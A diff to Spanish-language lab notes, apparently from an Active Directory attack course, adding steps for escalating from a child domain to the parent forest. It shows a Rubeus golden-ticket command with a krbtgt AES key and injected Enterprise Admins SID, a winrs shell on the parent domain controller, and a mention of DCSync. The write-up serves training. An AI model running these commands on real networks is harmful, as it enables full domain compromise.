@@ -1383,4 +1383,15 @@ winrs -r:mcorp-dc.moneycorp.local cmd
 *LO - 19*
 Escalar privilegios usando el acceso de *Domain Admin* para llegar al dominio padre *moneycorp.local* usando el hash *krbtgt* de *dollarcorp*
 
-El hash 
+El hash de *krbtgt* ya le tenemos de *dcorp-dc* ahora crearemos el TGT i inter-realm y lo inyectaremos
+```shell
+C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-golden /user:Administrator /id:500 /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-519 /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /netbios:dcorp /ptt
+```
+
+Pudiendo ahora acceder a *mcorp-dc*
+
+```shell
+winrs -r:mcorp-dc.moneycorp.local cmd
+```
+
+Tambien podemos ejecutar ataques *DCSync* contra *moneycorpo* 
